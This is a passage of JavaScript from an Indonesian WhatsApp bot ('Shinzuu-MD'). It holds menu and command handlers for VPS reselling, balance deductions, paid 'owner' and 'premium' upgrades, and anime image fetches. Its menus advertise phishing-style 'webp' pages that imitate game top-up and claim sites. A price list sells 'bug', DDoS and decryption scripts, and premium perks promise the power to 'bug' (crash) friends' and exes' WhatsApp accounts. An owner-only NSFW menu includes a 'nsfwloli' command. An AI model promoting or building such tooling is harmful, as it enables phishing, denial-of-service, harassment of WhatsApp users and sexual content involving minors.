- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "webpmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textoto = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *W E B P - M E N U*


々 ${prefix}webp1 (MediaFire Cahyo)
々 ${prefix}webp2 (MediaFire File)
々 ${prefix}webp3 (Grup wa 18+)
々 ${prefix}webp4 (Codashop FF)
々 ${prefix}webp5 (FF Spin SG)
々 ${prefix}webp6 (FF Claim)
々 ${prefix}webp7 (Pubgm12)
々 ${prefix}webp8 (Mobile-Legends)
々 ${prefix}webp9 (Simontok Full Info)
々 ${prefix}bahanYT
々 ${prefix}bahantwit
々 ${prefix}addgcweb

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "vpsmenu":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
    const cvps = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *V P S - M E N U*

々 ${prefix}vpsdo
々 ${prefix}listvps1 
々 ${prefix}listvps2 

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: cvps,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio5.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "vpsdo":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
    const cvps = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *V P S D O - M E N U*

々 ${prefix}deldroplet
々 ${prefix}svps / sendvps
々 ${prefix}sdomain / sendomain
々 ${prefix}listdroplet
々 ${prefix}cekdroplet
々 ${prefix}turnoff
々 ${prefix}turnon
々 ${prefix}sisadroplet
々 ${prefix}rebuild
々 ${prefix}restartvps
々 ${prefix}vps1g1c
々 ${prefix}vps2g1c
々 ${prefix}vps4g2c
々 ${prefix}vps8g4c
々 ${prefix}listvps1 
々 ${prefix}listvps2 

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio5.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "buyvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textvps = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Hz Offcial 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST VPS DIGITALOCEAN ｣*

⭔●${prefix}buypaketvps1g1c
⭔●${prefix}buypaketvps2g1c
⭔●${prefix}buypaketvps2g2c
⭔●${prefix}buypaketvps4g2c
⭔●${prefix}buypaketvps8g4c


`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio5.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "panel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const text12 = `*Hi @${sender.split("@")[0]} 👋*

ShinzuuMD
BY HARDZ OFFC

CARA ADD USER PANEL :
ram user,nomer

contoh server 1 : 1gb hzoffc,6282192773770
contoh server 2 : 1gbb hzoffc,6282192773770
`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, hardznum],
externalAdReply: {
showAdAttribution: true,
title: '❦︎ 𝐓𝐇𝐄 𝐃𝐀𝐑𝐊 𝐅𝐀𝐌𝐈𝐋𝐘 ❦',
body: '𝚂𝚑𝚒𝚗𝚣𝚞𝚞 - 𝙼𝙳',
thumbnail: 'thumbnail1',
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 2, 
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/ramlist.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:fkontak})}
break
case "buysrv": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 Hz Offcial 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI*_
⭔●${prefix}srvpaket7 _*Ram 6GB/6GB*_
⭔●${prefix}srvpaket8 _*Ram 7GB/7GB*_
⭔●${prefix}srvpaket9 _*Ram 8GB/8GB*_
⭔●${prefix}srvpaket10 _*Ram 9GB/9GB*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup Yaa Gausah Ngelunjak 

Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 
 case "buyowner":
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282192773770`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknbos = await Biiofc.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknbos.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Selamat Kepada ${pushname} dengan nomor ${bnnd} telah premium 

Keuntungan Owner👇🏻
-Muncul dalam daftar Owner
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
        minSaldo(sender, 20000, db_saldo)
break
        case "buyprem":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6282192773770`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Selamat Kepada ${pushname} dengan nomor ${prrkek} telah premium 

Keuntungan Premium👇🏻
-Bisa Akses Semua Bug
-Bisa Create Panel
-Bisa Bug Temen Usil
-Bisa Bug Mantan

NOTE:WAJIB JEDA GA JEDA? DELPREM 
#ALL TRX NO REFF`)
}
   minSaldo(sender, 10000, db_saldo)     
break
        case 'minsaldo':
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Dia saldonya ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)}, jadi jangan melebihi ${cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo)} yah kak🙏`)
minSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(50)
m.reply(`「 *SALDO USER* 」
⭔ID: ${q.split(",")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
break
case "buysc": case "cekharga": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY SCRIPT* )▭▬▭

*Mau Buy Sc? Pilih Sc Dibawah Ini* :

*Sc Bug v1 10k*
*Sc Bug v2 25k*
*Sc Bug v3 35k*
*Sc Hw 19 15k*
*Sc Hw 19 Fitur Jpm 20k*
*Sc Hw 19 Fitur Jpm + Cpanel 25k*
*Sc Campuran v2 15k*
*Sc Campuran v3 25k*
*Sc Campuran v3 + Subdo 30k*
*Sc Campuran v4 35k*
*Sc Campuran v5 40k*
*Sc Campuran v6 60k*
*Sc Campuran v6 + Subdo 70k*
*Sc Campuran v7 + otp 75k*
*Sc Campuran v7 + addpm2 85k*
*Sc Campuran v8 90k* ( Free Panel Unli )
*Sc Cvps v1 50k*
*Sc Cvps v2 80k* ( Free Panel Unli )
*Sc Jaga Grupv1 10k*
*Sc Jaga Grupv2 15k*
*Sc Pushkontak 10k*
*Sc PushAutoSave 15k*
*Sc Jpm X PushKntk v1 15k*
*Sc Jpm X PushKntk v2 20k*
*Sc Jpm X PushKntk v3 25k*
*Sc Themav1 10k*
*Sc Themav2 15k*
*Sc Nowa 20k*
*Sc Webp 10k*
*Sc Tesmoni 15k*
*Sc Ddos 20k*
*Sc Buka Enc 15k*
*Module 15k*
*Admin Panel 15k ( Garansi 7Day )*
*All Vps ( Pm Owner )*

*Usahakan Saldo Mu Mencukupi Ya Kak🙏*

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'nsfwmenu': {

if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 Anime NSFW 』
々 ${prefix}hentai 
々 ${prefix}gifhentai 
々 ${prefix}gifblowjob 
々 ${prefix}hentaivid 
々 ${prefix}hneko 
々 ${prefix}nwaifu 
々 ${prefix}animespank 
々 ${prefix}trap 
々 ${prefix}gasm 
々 ${prefix}ahegao 
々 ${prefix}ass 
々 ${prefix}bdsm 
々 ${prefix}blowjob 
々 ${prefix}cuckold 
々 ${prefix}cum 
々 ${prefix}milf 
々 ${prefix}eba 
々 ${prefix}ero 
々 ${prefix}femdom 
々 ${prefix}foot 
々 ${prefix}gangbang 
々 ${prefix}glasses 
々 ${prefix}jahy 
々 ${prefix}masturbation 
々 ${prefix}manga 
々 ${prefix}neko-hentai 
々 ${prefix}neko-hentai2 
々 ${prefix}nsfwloli 
々 ${prefix}orgy 
々 ${prefix}panties  
々 ${prefix}pussy 
々 ${prefix}tentacles 
々 ${prefix}thighs 
々 ${prefix}yuri 
々 ${prefix}zettai 

Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'animev2menu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 AnimeV2 』
々 ${prefix}akira 
々 ${prefix}akiyama 
々 ${prefix}ana ??
々 ${prefix}asuna 
々 ${prefix}ayuzawa 
々 ${prefix}boruto 
々 ${prefix}chiho 
々 ${prefix}chitoge 
々 ${prefix}cosplayloli 
々 ${prefix}cosplaysagiri 
々 ${prefix}deidara 
々 ${prefix}doraemon 
々 ${prefix}elaina 
々 ${prefix}emilia 
々 ${prefix}erza 
々 ${prefix}gremory 
々 ${prefix}hestia 
々 ${prefix}hinata 
々 ${prefix}husbu 
々 ${prefix}inori 
々 ${prefix}isuzu 
々 ${prefix}itachi 
々 ${prefix}itori 
々 ${prefix}kaga 
々 ${prefix}kagura 
々 ${prefix}kakasih 
々 ${prefix}kaori 
々 ${prefix}keneki 
々 ${prefix}kotori 
々 ${prefix}kurumi 
々 ${prefix}loli 
々 ${prefix}madara 
々 ${prefix}megumin 
々 ${prefix}mikasa 
々 ${prefix}mikey 
々 ${prefix}miku 
々 ${prefix}minato 
々 ${prefix}naruto 
々 ${prefix}neko 
々 ${prefix}neko2 
々 ${prefix}nekonime 
々 ${prefix}nezuko 
々 ${prefix}onepiece 
々 ${prefix}pokemon 
々 ${prefix}randomnime 
々 ${prefix}randomnime2 
々 ${prefix}rize 
々 ${prefix}sagiri 
々 ${prefix}sakura 
々 ${prefix}sasuke 
々 ${prefix}shina 
々 ${prefix}shinka 
々 ${prefix}shinomiya 
々 ${prefix}shizuka 
々 ${prefix}shota
々 ${prefix}tejina 
々 ${prefix}toukachan 
々 ${prefix}tsunade 
々 ${prefix}waifu 
々 ${prefix}animewall 
々 ${prefix}yotsuba 
々 ${prefix}yuki 
々 ${prefix}yulibocil 
々 ${prefix}yumeko 
々 ${prefix}8ball 
々 ${prefix}tickle 
々 ${prefix}gecg 
々 ${prefix}feed 
々 ${prefix}animeawoo 
々 ${prefix}animemegumin 
々 ${prefix}animeshinobu 
々 ${prefix}animehandhold 
々 ${prefix}animehighfive 
々 ${prefix}animecringe 
々 ${prefix}animedance 
々 ${prefix}animehappy 
々 ${prefix}animeglomp 
々 ${prefix}animeblush 
々 ${prefix}animesmug 
々 ${prefix}animewave 
々 ${prefix}animesmille 
々 ${prefix}animepoke 
々 ${prefix}animewink 
々 ${prefix}animebonk 
々 ${prefix}animebully 
々 ${prefix}animeyeet 
々 ${prefix}animebite 
々 ${prefix}animelick 
々 ${prefix}animekill 
々 ${prefix}animecry 
々 ${prefix}animewlp 
┆❏々 ${prefix}imekiss 
┆❏々 ${prefix}imehug 
々 ${prefix}animeneko 
々 ${prefix}animepat 
々 ${prefix}animeslap 
々 ${prefix}animecuddle 
々 ${prefix}banimewaifu 
々 ${prefix}animenom 
々 ${prefix}animefoxgirl 
々 ${prefix}animegecg 
々 ${prefix}animetickle 
々 ${prefix}animefeed 
々 ${prefix}animeavatar 
々 ${prefix}genshin
々 ${prefix}anime 

Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'openaimenu': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*  
╭––『 OpenAI 』
┆
々 ${prefix}openai 
々 ${prefix}ai 
々 ${prefix}aimage 
々 ${prefix}remini 

Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnail: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case 'animeawoo':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animemegumin':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeshinobu':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehandhold':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehighfive':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecringe':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animedance':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehappy':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeglomp':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmug':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeblush':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewave':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animesmile':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animepoke':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewink':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebonk':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebully':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeyeet':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animebite':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animelick':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekill':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animecry':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animewlp':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animekiss':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animehug':{
XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Biiofc.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.success}, { quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
case 'animeneko':{
XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
